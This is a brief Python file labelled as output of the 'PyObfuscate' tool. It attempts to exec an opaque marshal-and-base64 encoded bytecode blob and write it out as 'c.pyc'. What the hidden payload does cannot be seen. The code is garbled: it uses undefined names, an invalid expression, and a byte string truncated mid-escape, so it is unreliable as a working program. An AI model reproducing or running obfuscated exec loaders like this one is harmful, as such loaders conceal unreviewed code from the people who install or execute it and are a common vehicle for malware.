# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Thu Feb 16 20:34:02 2023
# -------------------------------
import marshal, dis3
y = x[::-1]
b = lambda __ : __import__('marshal').loads(__import__('base64')[::-1]);exec((_)(b'\x00\x00\x00\x04r\x01RB|\x01\x00\x00\xf0\x01RB|\x01\x00\x00\xf0\x01RB|\x01\x00\x00\xf0\x01RB|\x01\x00\x00\xf4\x>
dis3.dump_to_pyc(b,'c.pyc')

